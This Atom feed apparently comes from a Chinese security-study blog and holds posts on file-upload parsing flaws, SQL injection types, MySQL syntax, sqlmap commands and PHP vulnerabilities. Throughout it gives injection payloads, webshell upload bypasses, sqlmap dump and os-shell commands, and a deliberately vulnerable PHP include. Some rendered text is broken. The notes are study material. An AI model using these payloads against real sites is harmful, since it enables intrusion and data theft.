<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zpdad26.github.io/</id>
    <title>z3p.l0ve</title>
    <updated>2020-12-01T13:29:44.832Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zpdad26.github.io/"/>
    <link rel="self" href="https://zpdad26.github.io/atom.xml"/>
    <subtitle>NO PATCH FOR STUPID!</subtitle>
    <logo>https://zpdad26.github.io/images/avatar.png</logo>
    <icon>https://zpdad26.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, z3p.l0ve</rights>
    <entry>
        <title type="html"><![CDATA[文件上传漏洞]]></title>
        <id>https://zpdad26.github.io/post/wen-jian-shang-chuan-lou-dong/</id>
        <link href="https://zpdad26.github.io/post/wen-jian-shang-chuan-lou-dong/">
        </link>
        <updated>2020-12-01T13:26:14.000Z</updated>
        <summary type="html"><![CDATA[<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
]]></summary>
        <content type="html"><![CDATA[<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
<!-- more -->
<h2 id="1iis-解析漏洞">1.IIS 解析漏洞</h2>
<p>IIS6.0 在解析文件时存在以下两个解析漏洞 .</p>
<p>①当建立 <code>*.asa</code> 、<code>*.asp</code> 格式的文件夹时 , 其目录下的任意文件豆浆被 IIS 当作 asp 文件 来解析 .</p>
<p>② 在 IIS6.0 下 , 分 号 后面 的 扩 展 名 不 会 被 解 析 , 也 就 是 说 当 文 件 为 <code>*.asp;.jpg</code></p>
<p>时,IIS6.0 同样会以 ASP脚本来执行 .</p>
<p>##2.Apache 解析漏洞</p>
<p>在 Apache 1.x 和 Apache 2.x 中存在解析漏洞 , 但他们与 IIS 解析漏洞不同 .</p>
<p>Apache 在解析文件时有一个规则 : 当碰到不认识的扩展名时 , 将会从后向前解析 , 直到 碰到认识的扩展名位置 , 如果都不认识 , 则会暴露其源码 . 比如 :</p>
<pre><code>php.rar.xx.aa
</code></pre>
<p>Apache 首先会解析 aa 扩展名 , 如果不认识则接着解析 xx 扩展名 , 这样一直遍历到认识 的扩展名为止 , 然后再将其进行解析 .</p>
<p>##3.PHP CGI 解析漏洞</p>
<p>在 PHP的配置文件中有一个关键的选项 :<code>cgi.fi: x_pathinfo</code>. 这个选项在某些版本是</p>
<p>默认开启的 , 在开启时访问 url, 比如 :http://www.xxx.com/x.txt/x.php,x.php 是不存在的 文件 , 所以 php 将会向前递归解析 , 于是就造成了解析漏洞 . 由于这种漏洞常见于 IIS7.0 、 IIS7.5 、 Nginx 等 Web服务器 , 所以经常会被误认为是这些 Web服务器的解析漏洞 .</p>
<p>##4.Nginx &lt;8.03 空字节代码执行漏洞</p>
<p>影响版本 :0.5,0.6,0.7&lt;=0.7.65 0.8&lt;=0.8.37</p>
<p>Nginx 在图片中嵌入 PHP代码 , 然后通过访问<code>xxx.jpg%00.php</code> 可以执行其中的代码 .<br>
##5. 其他</p>
<p>在 windows  环境下， <code>xx.jpg[ 空格 ]</code> 或 <code>xx.jpg.</code> 这两类文件都是不允许存在的 , 若这样命 名,windows 会默认除去空格或点 , 攻击者可以通过抓包 , 在文件名后加一个空格或者点绕过 黑名单 . 若上传成功 , 空格和点都会被 windows 自动消除 , 这样也可以 getshell.</p>
<p>如果在 Apache 中 .htaccess 可被执行 . 且可被上传 . 那可以尝试在 .htaccess 中写入 :</p>
<pre><code>SetHandlerapplication/x-httpd-php
</code></pre>
<p>然后再上传名称为 shell.jpg 的 webshell, 这样 shell.jpg 就可解析为 php 文件 .</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[各种类型的sql注入原理]]></title>
        <id>https://zpdad26.github.io/post/ge-chong-lei-xing-de-sql-zhu-ru-yuan-li/</id>
        <link href="https://zpdad26.github.io/post/ge-chong-lei-xing-de-sql-zhu-ru-yuan-li/">
        </link>
        <updated>2020-12-01T08:37:05.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p>本文讲述常见的sql注入基本类型的原理，具体的例子就以后由题目再进行总结吧。</p>
<!-- more -->
<!-- more -->
<h2 id="目录">目录</h2>
<pre><code>最基础的注入-union注入攻击
Boolean注入攻击-布尔盲注
报错注入攻击
时间注入攻击-时间盲注
堆叠查询注入攻击
二次注入攻击
宽字节注入攻击
base64注入攻击
cookie注入攻击-http请求头参数注入
XFF注入攻击-http请求头参数注入
知道绝对路径的注入
</code></pre>
<h3 id="1union">1.UNION</h3>
<p>UNION操作符用于合并两个或多个SELECT语句的结果集，而且UNION内部的SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时，每条SELCCT语句中的列的顺序必须相同</p>
<h4 id="流程">流程：</h4>
<p>1.确保两张表结构一致<br>
2.判断时字符型注入还是数字型注入<br>
3.使用ORDER BY 查询列数。<br>
4.获取数据库名。<br>
5.获取数据库中的所有表名。<br>
6.获取数据库的表中的所有字段名<br>
7.获取字段中的数据</p>
<h3 id="2boolean注入攻击-布尔盲注">2.Boolean注入攻击-布尔盲注</h3>
<p>查看现象，能报错，但没有报错信息，正确查询也显示不了查询内容就属于布尔盲注，只存在两种状态，对或错；<br>
由页面的两种不同返回的状态来判定我们的闭合规则；<br>
为了方便，我们这里假设返回正确用“yes”，返回错误用“no”来表示这两种状态<br>
找到闭合规则后，我们在闭合规则里面  and 1=1 和 and 1=2 测试一下，看看最后返回是不是两种状态；<br>
布尔盲注要用到<code>length()和substr()</code>语句，用两种状态来猜解数据库、表名等的长度和正确字母；<br>
先用 <code>and length(database())&gt;2</code>来猜数据库的长度，使用的是二分法；<br>
再用 <code>and substr(database(),1,1)='t'</code> 来确定第一个字母，可用burp跑，26个字母,哪个字母返回yes则代表第一个字母就是它；<br>
and substr(database(),2,1)='t' 代表当前数据库的第二个字母；<br>
最后结合长度，成功的将数据库猜解出来；<br>
后面的操作跟union注入的步骤差不多了，只是sql语句写在 上文的 database() 处。</p>
<h3 id="3报错注入攻击">3.报错注入攻击</h3>
<p>1.只要注入点有sql报错信息，那么就可以使用报错注入；<br>
2.还是一样，引号报错，然后找到闭合规则，页面正常显示，则可以在闭合规则中开始写入报错注入的sql语句；<br>
3.updatexml报错获取当前数据库：</p>
<pre><code>and updatexml(1,concat(0x7e,(select database()),0x7e),1)
</code></pre>
<p>4.floor报错获取当前数据库：</p>
<pre><code>and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)
</code></pre>
<p>5.两种方式都可行，如果第一个不行就试试第二个<br>
6.接着可以利用select语句替换掉上面database()来继续获取数据库中的表名、字段名，查询语句和union注入攻击的语句相同；<br>
7.只不过这里不能再使用group_concat了，因为报错注入只显示一条结果，所以需要使用limit语句；</p>
<h3 id="4时间注入攻击-时间盲注">4.时间注入攻击-时间盲注</h3>
<p>没有明确的现象，不管是对是错都返回一个状态；<br>
但是如果用sleep(5)方法，能让响应时间延迟为5秒以上，那么就为时间盲注；<br>
1.我们用sleep(5)函数构造了一个时间延时的状态，因此，我们又有了两种状态，像布尔盲注一样可以根据这两种状态来判定数据库、表名和字段名的长度和正确的每个字母；<br>
2.同样的找到正确的闭合规则，当然，这个闭合规则得配合着 and sleep(5)语句来构造，哪一个闭合规则执行了sleep(5)，那么就是正确得闭合规则；<br>
3.时间盲注配合着  if(A,B,C)  语句结合使用，含义是：如果A是 true，则返回B（也就是执行B），否则返回C（执行C）；<br>
那么判断当前数据库名的长度的语句为：</p>
<pre><code> if (length(database())&gt;1,sleep(5),1)
</code></pre>
<p>就是说如果数据库长度大于1，那么响应延时5秒，否则执行select 1(也就是不延时)，由此来推出数据库长度。<br>
判断当前数据库名的第一个和第二个字母的语句：</p>
<pre><code>    if(substr(database(),1,1)='s',sleep(5),1)

    if(substr(database(),2,1)='s',sleep(5),1)
</code></pre>
<p>只有第一个字母等于26个字母中正确的字母时，才会延时5秒，因此可以通过burp或者sqlmap来跑。<br>
根据数据库名长度以此内推即可得出完整的数据库的库命、表名、字段名和具体内容。</p>
<h3 id="5堆叠查询注入攻击">5.堆叠查询注入攻击</h3>
<p>1.可以使用堆叠注入的地方也可以使用布尔盲注与时间盲注；<br>
2.同样先找出正确的闭合规则，然后也看两种状态来猜解库名、表名等；<br>
3. 堆叠注入的语句为</p>
<pre><code>    ;select if(length(database())&gt;1,sleep(3),1)
    ;select if(substr(database(),1,1)='r',sleep(3),1)
</code></pre>
<p>按照原理来说，分号后面可以执行新sql语句，但是很多时候没必要，如果遇到其他注入方法（或者绕过方式）不行的情况下可以试试这个注入方式；不是很常用。</p>
<h3 id="6二次注入攻击">6.二次注入攻击</h3>
<p>二次注入一共有两个url，url一用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；</p>
<!-- more -->
<p>也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；</p>
<!-- more -->
<p>就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；</p>
<!-- more -->
<p>跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；</p>
<!-- more -->
<p>后面就是union注入攻击的常规操作。</p>
<h3 id="7宽字节注入攻击">7.宽字节注入攻击</h3>
<p>如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；<br>
一般情况下，此处就不存在sql注入漏洞的；</p>
<!-- more -->
<p>但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；</p>
<!-- more -->
<p>宽字节的格式是在地址后先加一个 <code>%df</code>,</p>
<!-- more -->
<p>再加单引号，因为反斜杠的编码为%5c，在GBK编码中，<code>%df%5c</code>是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；</p>
<!-- more -->
<p>因此构造闭合规则时，在单引号前面加上  %df 就行了；</p>
<!-- more -->
<p>之后在闭合规则中写入同union注入的一些查询语句就行了；</p>
<h3 id="8base64注入攻击">8.base64注入攻击</h3>
<p>如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；</p>
<!-- more -->
<p>那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；</p>
<!-- more -->
<p>注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则。</p>
<h3 id="9http请求头参数注入-cookie注入攻击">9.HTTP请求头参数注入-cookie注入攻击</h3>
<p>包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；<br>
常见的http头部注入的参数有：</p>
<!-- more -->
<pre><code>【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】
</code></pre>
<!-- more -->
<p>如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；<br>
和union注入的差别就在于注入点不一样，之后使用union注入的方法即可。</p>
<h3 id="10http请求头参数注入-xff注入攻击">10.HTTP请求头参数注入-XFF注入攻击</h3>
<p>XFF注入即HTTP头部的<code>X-Forwarded-for</code>参数存在sql注入；</p>
<!-- more -->
<p>例如测试此参数的值 <code>X-Forwarded-for:127.0.0.1'</code>  响应有sql报错，那么此处就是注入点；</p>
<!-- more -->
<p>之后使用union注入的方法完成即可。</p>
<p>###11.知道绝对路径的注入<br>
如果通过一些方式爆出了网站的根目录，并且知道此站点存在sql注入；</p>
<!-- more -->
<p>猜测此数据库可能有file权限，那么我们就可以使用语句：<code>into outfile</code> 来写shell到网站的根目录下，之后用菜刀连接；</p>
<!-- more -->
<p>如果数据库没有file权限，那么我们用sqlmap的参数 <code>--is-dba</code>  来查看当前数据库的用户是否有管理员权限；</p>
<!-- more -->
<p>如果有管理员权限，我们就可以使用sqlmap里面的参数命令<code>--os-shell</code>  来上传、反弹shell，最终getshell；</p>
<!-- more -->
<p>如果file、管理员权限都没有，那么另寻思路，日志、缓存写入等。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[mysql基础语法]]></title>
        <id>https://zpdad26.github.io/post/mysql-ji-chu-yu-fa/</id>
        <link href="https://zpdad26.github.io/post/mysql-ji-chu-yu-fa/">
        </link>
        <updated>2020-12-01T08:13:37.000Z</updated>
        <summary type="html"><![CDATA[<p>MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。<br>
文章列出一些mysql基础语法。</p>
]]></summary>
        <content type="html"><![CDATA[<p>MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。<br>
文章列出一些mysql基础语法。</p>
<!-- more -->
<h2 id="一些最重要的-sql-命令">一些最重要的 SQL 命令:</h2>
<pre><code>CREATE DATABASE - 创建新数据库
ALTER DATABASE - 修改数据库
CREATE TABLE - 创建新表
ALTER TABLE - 变更（改变）表
DROP TABLE - 删除表
SELECT - 从数据库中提取数据
UPDATE - 更新数据库中的数据
DELETE - 从数据库中删除数据
INSERT INTO - 向数据库中插入新数据
CREATE INDEX - 创建索引（搜索键）
DROP INDEX - 删除索引
</code></pre>
<h2 id="select-语句">SELECT 语句</h2>
<p>SELECT 语句用于从数据库中选取数据<br>
语法：</p>
<pre><code>SELECT column_name,column_name FROM table_name; 
SELECT * FROM table_name; 
</code></pre>
<h2 id="select-distinct-语句">SELECT DISTINCT 语句</h2>
<pre><code>SELECT DISTINCT column_name,column_name FROM table_name; 
</code></pre>
<h2 id="where-子句">WHERE 子句</h2>
<p>WHERE 子句用于提取那些满足指定标准的记录<br>
语法：</p>
<pre><code>ELECT column_name,column_name FROM table_name WHERE column_name operator value;
</code></pre>
<p>举例：</p>
<pre><code>--从 &quot;Websites&quot; 表中选取国家为 &quot;CN&quot; 的所有网站 
SELECT * FROM Websites WHERE country='CN'; 
</code></pre>
<p>注：SQL 使用单引号来环绕文本值，如果是数值字段，不要使用引号</p>
<!-- more -->
<h3 id="where-子句中的运算符">WHERE 子句中的运算符：</h3>
<p>运算符描述=等于&lt;&gt;不等于。</p>
<p>注释：在 SQL 的一些版本中，该操作符可被写成 !=&gt;大于&lt;小于&gt;=大于等于&lt;=小于等于BETWEEN在某个范围内LIKE搜索某种模式IN指定针对某个列的多个可能值</p>
<!-- more -->
<h3 id="where-子句-2">Where 子句：</h3>
<p>搜索 empno 等于 7900 的数据：</p>
<pre><code>Select * from emp where empno=7900; 
</code></pre>
<h3 id="where-条件筛选行">Where +条件（筛选行）：</h3>
<p>条件：列，比较运算符，值</p>
<p>比较运算符包涵：= &gt; &lt; &gt;= ,&lt;=, !=,&lt;&gt; 表示（不等于）</p>
<pre><code>Select * from emp where ename='SMITH'; 
</code></pre>
<p>例子中的 SMITH 用单引号引起来，表示是字符串，字符串要区分大小写。</p>
<!-- more -->
<h2 id="逻辑运算">逻辑运算：</h2>
<p>1.And:与 同时满足两个条件的值。</p>
<pre><code>Select * from emp where sal &gt; 2000 and sal &lt; 3000; 
</code></pre>
<p>2.Or:或 满足其中一个条件的值</p>
<pre><code>Select * from emp where sal &gt; 2000 or comm &gt; 500;//查询 emp 表中 SAL 大于 2000 或 COMM 大于500的值。
</code></pre>
<p>3.Not:非 满足不包含该条件的值。</p>
<pre><code>select * from emp where not sal &gt; 1500; //查询EMP表中 sal 小于等于 1500 的值。
</code></pre>
<h4 id="逻辑运算的优先级-not-and-or">逻辑运算的优先级：() not and or</h4>
<h3 id="特殊条件">特殊条件：</h3>
<h4 id="1空值判断-is-null">1.空值判断： is null</h4>
<pre><code>Select * from emp where comm is null; //查询 emp 表中 comm 列中的空值。
</code></pre>
<h4 id="2between-and-在-之间的值">2.between and (在 之间的值)</h4>
<pre><code>Select * from emp where sal between 1500 and 3000; //查询 emp 表中 SAL 列中大于 1500 的小于 3000 的值。
</code></pre>
<p>注意：大于等于 1500 且小于等于 3000， 1500 为下限，3000 为上限，下限在前，上限在后，查询的范围包涵有上下限的值。</p>
<p>####3.In</p>
<pre><code>Select * from emp where sal in (5000,3000,1500); //查询 EMP 表 SAL 列中等于 5000，3000，1500 的值。
</code></pre>
<h4 id="4like">4.like</h4>
<pre><code>Select * from emp where ename like 'M%'; //查询 EMP 表中 Ename 列中有 M 的值，M 为要查询内容中的模糊信息。
</code></pre>
<p>% 表示多个字值，_ 下划线表示一个字符；<br>
M% : 为能配符，正则表达式，表示的意思为模糊查询信息为 M 开头的。<br>
%M% : 表示查询包含M的所有内容。<br>
%M_ : 表示查询以M在倒数第二位的所有内容。</p>
<h2 id="and-or-运算符">AND &amp; OR 运算符：</h2>
<p>AND &amp; OR 运算符用于基于一个以上的条件对记录进行过滤</p>
<pre><code>--从 &quot;Websites&quot; 表中选取 alexa 排名大于 &quot;15&quot; 且国家为 &quot;CN&quot; 或 &quot;USA&quot; 的所有网站 
SELECT * FROM Websites WHERE alexa &gt; 15 AND (country='CN' OR count
</code></pre>
<h2 id="order-by-关键字">ORDER BY 关键字：</h2>
<p>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序，ORDER BY 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，可以使用 DESC 关键字<br>
语法：</p>
<pre><code>SELECT column_name,column_name FROM table_name 
ORDER BY column_name,column_name ASC|DESC; 
</code></pre>
<!-- more -->
<p>举例：</p>
<pre><code>--从 &quot;Websites&quot; 表中选取所有网站，并按照 &quot;alexa&quot; 列排序 
SELECT * FROM Websites ORDER BY alexa; 

--从 &quot;Websites&quot; 表中选取所有网站，并按照 &quot;alexa&quot; 列降序排序 
SELECT * FROM Websites ORDER BY alexa DESC; 

--从 &quot;Websites&quot; 表中选取所有网站，并按照 &quot;country&quot; 和 &quot;alexa&quot; 列排序 
SELECT * FROM Websites ORDER BY country,alexa; 
</code></pre>
<h2 id="insert-into-语句">INSERT INTO 语句：</h2>
<p>INSERT INTO 语句用于向表中插入新记录<br>
语法：<br>
INSERT INTO 语句可以有两种编写形式。<br>
第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：</p>
<pre><code>NSERT INTO table_name VALUES (value1,value2,value3,...); 
</code></pre>
<p>第二种形式需要指定列名及被插入的值：</p>
<pre><code>INSERT INTO table_name (column1,column2,column3,...) VALUES (value1,valu
</code></pre>
<p>###注：insert into select 和select into from 的区别</p>
<pre><code> --插入一行,要求表scorebak 必须存在 
insert into scorebak select * from socre where neza='neza' 
  
--也是插入一行,要求表scorebak 不存在 
select *  into scorebak from score  where neza='neza' 
</code></pre>
<p>##UPDATE 语句：<br>
UPDATE 语句用于更新表中已存在的记录</p>
<p>语法：</p>
<pre><code>UPDATE table_name SET column1=value1,column2=value2,... 
WHERE some_column=some_value; 
</code></pre>
<h2 id="delete-语句">DELETE 语句：</h2>
<p>DELETE 语句用于删除表中的行<br>
语法：</p>
<pre><code>DELETE FROM table_name WHERE some_column=some_value; 
</code></pre>
<h3 id="删除所有数据">删除所有数据：</h3>
<p>可以在不删除表的情况下，删除表中所有的行。这意味着表结构、属性、索引将保持不变：</p>
<pre><code>DELETE FROM table_name; 
DELETE * FROM table_name; 
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Sqlmap基本语法]]></title>
        <id>https://zpdad26.github.io/post/sqlmap-ji-ben-yu-fa/</id>
        <link href="https://zpdad26.github.io/post/sqlmap-ji-ben-yu-fa/">
        </link>
        <updated>2020-11-28T09:56:30.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。</p>
<!-- more -->
<!-- more -->
<h2 id="1基本语法">1.基本语法</h2>
<pre><code>sqlmap -u url --is-dba ：判断当前用户是否有管理员权限

sqlmap -u url --roles ：列出数据库所有管理员角色

sqlmap -u url --current-db ：查看当前数据库

sqlmap -u url -D 库名 --tables  ：爆表

sqlmap -u url -D 库名 -T 表明 --columns ：爆字段

sqlmap -u url -D 库名 -T 表明 --C 字段名1，字段名2 --dump ：爆数据

sqlmap -u url -D 库名 --dump-all ：爆出数据库中所有数据
</code></pre>
<p>如果我们想对抓取包进行爆破的话，<br>
<code>sqlmap -r http.txt ：http.txt</code><br>
使我们抓取的http请求包</p>
<!-- more -->
<p><code>sqlmap -r http.txt -p username</code>  ：指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测</p>
<h2 id="2结合bpsuite的使用方法">2.结合bpsuite的使用方法：</h2>
<p>（1）浏览器打开目标地址http://www.antian365.com<br>
（2）配置burp代理(127.0.0.1:8080)以拦截请求<br>
（3）点击登录表单的submit按钮<br>
（4）Burp会拦截到了我们的登录POST请求<br>
（5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下<br>
（6）运行sqlmap并使用如下命令：</p>
<h3 id="3详细的sqlmap使用攻略和技巧分析">3.<a href="https://www.freebuf.com/sectool/164608.html">详细的SQLMap使用攻略和技巧分析</a></h3>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PHP漏洞]]></title>
        <id>https://zpdad26.github.io/post/yi-php-lou-dong/</id>
        <link href="https://zpdad26.github.io/post/yi-php-lou-dong/">
        </link>
        <updated>2020-11-27T04:51:21.000Z</updated>
        <summary type="html"><![CDATA[<p>在学习完php基础知识后，将一些常见的php漏洞分析写在下面：<br>
后续例子就由题目来继续补充</p>
]]></summary>
        <content type="html"><![CDATA[<p>在学习完php基础知识后，将一些常见的php漏洞分析写在下面：<br>
后续例子就由题目来继续补充</p>
<!-- more -->
<h2 id="一php语言特性">一.PHP语言特性：</h2>
<h3 id="111比较操作符导致的漏洞弱类型">1.1.1比较操作符“==”导致的漏洞（弱类型）</h3>
<pre><code>$a==$b
$a===$b

$a==$b//等于TURE,类型转换后$a=$b
$a===$b//全等TURE,如果$a=$b,那么他们的类型也相同
</code></pre>
<!-- more -->
<p>如上图为php手册上的例子，可知道“==”的比较会先进行类型转换，再进行比较。</p>
<pre><code>&lt;?php
'a'==0 // true '12a'==12 //true '1'==1 //true '1aaaa55sss66'==1 //true 
</code></pre>
<h3 id="112md5sha1漏洞">1.1.2md5&amp;sha1（）漏洞</h3>
<p>首先了解到xex代表科学输入法，1e123456=1*10的123456次方。这里要说的是在遇到了0exxx这种字符串时，会将这种字符串解析为科学计数法，即上图两个式子就相等了</p>
<pre><code>&quot;0x1e240&quot;==&quot;123456&quot; //true
&quot;0x1e240&quot;==123456 //true
&quot;0x1e240&quot;==&quot;1e240&quot;//false
</code></pre>
<p>这段话的意思就是在比较时，会先将字符串解析成十进制的再进行比较，图中0x1e240解析成十进制为123456</p>
<pre><code>QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
</code></pre>
<p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。如下：</p>
<pre><code>var_dump(@md5([]) == @md5([])) //bool(true) var_dump(@md5([]) === @md5([])) //bool(true)，@表示忽略警告 var_dump(null === null); //bool(true)
</code></pre>
<!-- more -->
<p>sha1原理与md5()基本相同</p>
<h3 id="12反序列化漏洞">1.2反序列化漏洞</h3>
<h4 id="121-概念分析">1.2.1 概念分析：</h4>
<p>序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换成可取用格式（例如存成文件，存于缓冲，或经由网络中发送），以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。</p>
<!-- more -->
<p>概念很容易理解，其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。</p>
<!-- more -->PHP通过string serialize ( mixed $value )和mixed unserialize ( string $str )两个函数实现序列化和反序列化。这两种函数通过将任意类型的数据转换成string类型或者从string类型还原成任意类型
<!-- more --> php类可能会包含一些特殊的函数叫magic方法，magic方法命名是以符号__开头的，比如__construct()、__destruct()、__toString()、__sleep()、__wakeup()等等，这些函数在某些情况下会自动调用。一些magic函数及其用途如下：
<pre><code>__construct()当一个对象创建时被调用

__destruct()当一个对象销毁时被调用

__toString()当一个对象被当作一个字符串使用

__sleep() 在对象在被序列化之前运行

__wakeup将在序列化之后立即被调用所写的内容需要有对象中的成员变量的值
</code></pre>
<p>###1.3截断<br>
####1.3.1NULL(%00)截断原理：PHP内核由C语言实现，因此使用了C语言中的一些字符串处理函数，在遇到NULL字符时，处理函数就会将它当作结束标记。</p>
<h4 id="132利用方式">1.3.2利用方式：</h4>
<pre><code>在url中加入%00，如http://xxxx/shell.php%00.jpg
在burpsuite的16进制编辑工具将”shell.php .jpg”（带空格的）中间的空格由20改成00
</code></pre>
<!-- more -->url中的%00（形如%xx）,web server会把它当作十六进制处理，然后将该十六进制数据hex（00）“翻译”成统一的ascii码值“NUL（null）”，实现了截断。
<p>在2中，burpsuite用burp自带的十六进制编辑工具将”shell.php .jpg”(中间有空格)中的空格由20改成00，如果burp中有二进制编辑工具。</p>
<h4 id="133不正确的使用iconv函数新版本php已经得到修复">1.3.3不正确的使用iconv函数（新版本php已经得到修复）：</h4>
<p>在php中，所有的字符都是二进制的串，PHP本身并不认识任何编码，只是根据编码来显示内容。PHP中的chr() 函数从指定的 ASCII 值返回字符。ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置 0，而十六进制值被定义为带前置 0x。</p>
<!-- more -->
<pre><code>&lt;?php
$file = $_GET['file'].'.tpl.html';
include(iconv(&quot;UTF-8&quot;, &quot;gb2312&quot;, $file));
?&gt;
</code></pre>
<p>在遇到file变量中包含非法字符utf-8的时候，iconv就会截断这个字符。</p>
<!-- more -->
<pre><code>&lt;?php
for($k=0;$k&lt;=255;$k++)
{
$a='shell.php'.chr($k).&quot;1.jpg&quot;;
echo 'k:'.$k.'   '.'$a:'.$a.'   '.'iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a):'.iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a).&quot;\n&quot;;
}
?&gt;
</code></pre>
<p>通过fuzz发现，其中 iconv(“UTF-8”,”gbk”,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>)</mo><mi mathvariant="normal">或</mi><mi mathvariant="normal">是</mi><mi>i</mi><mi>c</mi><mi>o</mi><mi>n</mi><mi>v</mi><mo>(</mo><mi mathvariant="normal">“</mi><mi>U</mi><mi>T</mi><mi>F</mi><mo>−</mo><mn>8</mn><mi mathvariant="normal">”</mi><mo separator="true">,</mo><mi mathvariant="normal">”</mi><mi>g</mi><mi>b</mi><mn>2313</mn><mi mathvariant="normal">”</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">a) 或是 iconv(“UTF-8”,”gb2313”,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">是</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mopen">(</span><span class="mord">“</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">8</span><span class="mord">”</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">”</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">b</span><span class="mord">2</span><span class="mord">3</span><span class="mord">1</span><span class="mord">3</span><span class="mord">”</span><span class="mpunct">,</span></span></span></span>a) 都会在chr(128)到chr(255)之间截断，使结果为shell.php<br>
<img src="https://zpdad26.github.io//post-images/1606800076252.jpg" alt="" loading="lazy"></p>
<h3 id="14伪协议漏洞">1.4伪协议漏洞</h3>
<figure data-type="image" tabindex="1"><img src="https://zpdad26.github.io//post-images/1606800199553.png" alt="" loading="lazy"></figure>
<h4 id="141phpinput将文件包含漏洞变成代码执行漏洞">1.4.1php://input将文件包含漏洞变成代码执行漏洞</h4>
<p>①目标网站存在包含漏洞</p>
<pre><code>&lt;?php @include($_GET[&quot;file&quot;])?&gt;
</code></pre>
<p>②使用php://input，将执行代码通过在POST data中提交<br>
<img src="https://zpdad26.github.io//post-images/1606800334163.png" alt="" loading="lazy"></p>
<h4 id="142-phpinput利用文件包含写入shell">1.4.2 php://input利用文件包含写入shell</h4>
<p>①目标网站存在包含漏洞</p>
